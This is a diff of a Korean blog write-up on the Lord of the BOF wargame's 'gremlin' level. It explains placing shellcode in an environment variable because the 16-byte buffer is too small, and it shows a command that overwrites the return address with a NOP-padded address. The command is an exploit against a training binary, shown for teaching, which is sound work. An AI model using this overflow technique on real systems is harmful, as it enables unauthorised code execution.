@@ -4,7 +4,8 @@ categories: [Wargame, BOF]
 tags: [stack buffer overflow]
 ---
 
-## 1. Source Code
+## gremlin
+---
 ```c
 /*
         The Lord of the BOF : The Fellowship of the BOF
@@ -52,12 +53,16 @@ int main(int argc, char *argv[])
 0x8048479 <main+73>:    leave
 0x804847a <main+74>:    ret
 ```
+<br>
+<br>
 
-## 2. Vulnerability
+## Solution
+---
+버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음.  
+그래서 환경변수를 이용하여 문제를 해결해야 함.  
 
-버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음. 그래서 환경변수를 이용하여 문제를 해결해야 함.  
 환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. [환경변수 설정 및 주소 구하기](https://pistolwest.github.io/linux/bof/environment-value/)
-## 3. Solution
+
 환경변수 주소 ex)0xbffffc34 를 리턴 주소로 해주면 끝임. 
 ```
 ./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'`
